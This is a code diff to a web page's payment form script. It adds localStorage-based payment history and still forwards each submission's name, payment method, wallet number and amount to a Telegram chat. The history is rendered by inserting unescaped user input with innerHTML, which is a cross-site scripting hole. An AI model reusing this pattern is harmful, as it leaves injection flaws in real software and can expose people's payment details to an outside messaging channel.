@@ -87,6 +87,33 @@
     </div>
 
     <script>
+        // Load payment history from localStorage when the page loads
+        window.onload = function() {
+            loadPaymentHistory();
+        };
+
+        // Function to load payment history from localStorage
+        function loadPaymentHistory() {
+            const historyList = document.getElementById("historyList");
+            const payments = JSON.parse(localStorage.getItem("paymentHistory")) || [];
+            
+            // Clear the existing history list
+            historyList.innerHTML = '';
+
+            // Add each saved payment item to the history list
+            payments.forEach(function(payment) {
+                const paymentItem = document.createElement("div");
+                paymentItem.classList.add("paymentItem");
+                paymentItem.innerHTML = `
+                    <strong>Full Name:</strong> ${payment.fullName} <br>
+                    <strong>Payment Method:</strong> ${payment.paymentMethod} <br>
+                    <strong>Wallet Number:</strong> ${payment.walletNumber} <br>
+                    <strong>Amount:</strong> ${payment.amount} USD
+                `;
+                historyList.appendChild(paymentItem);
+            });
+        }
+
         // Function to submit the form
         function submitForm() {
             const fullName = document.getElementById("fullName").value;
@@ -105,7 +132,24 @@
                 return;
             }
 
-            // Prepare the message to send to Telegram
+            // Prepare the payment object
+            const payment = {
+                fullName: fullName,
+                paymentMethod: paymentMethod,
+                walletNumber: walletNumber,
+                amount: amount
+            };
+
+            // Get the existing payment history from localStorage
+            const payments = JSON.parse(localStorage.getItem("paymentHistory")) || [];
+
+            // Add the new payment to the beginning of the list
+            payments.unshift(payment);
+
+            // Save the updated payment history back to localStorage
+            localStorage.setItem("paymentHistory", JSON.stringify(payments));
+
+            // Send the payment details to Telegram
             const message = `
 Full Name: ${fullName}
 Payment Method: ${paymentMethod}
@@ -115,25 +159,11 @@ Amount: ${amount} USD
             sendToTelegram(message);
             alert("Submission Successful!");
 
-            // Add the payment details to the history list
-            const historyList = document.getElementById("historyList");
-            const paymentItem = document.createElement("div");
-            paymentItem.classList.add("paymentItem");
-            paymentItem.innerHTML = `
-                <strong>Full Name:</strong> ${fullName} <br>
-                <strong>Payment Method:</strong> ${paymentMethod} <br>
-                <strong>Wallet Number:</strong> ${walletNumber} <br>
-                <strong>Amount:</strong> ${amount} USD
-            `;
-            historyList.prepend(paymentItem); // Add new payment on top
+            // Reload payment history to display the new entry
+            loadPaymentHistory();
 
             // Clear the form fields after submission
             document.getElementById("paymentForm").reset();
-
-            // Auto redirect back after 0 seconds
-            setTimeout(function() {
-                window.history.back(); // Go back to the previous page
-            }, 0); // 0 seconds after submission
         }
 
         // Function to go back to the previous page
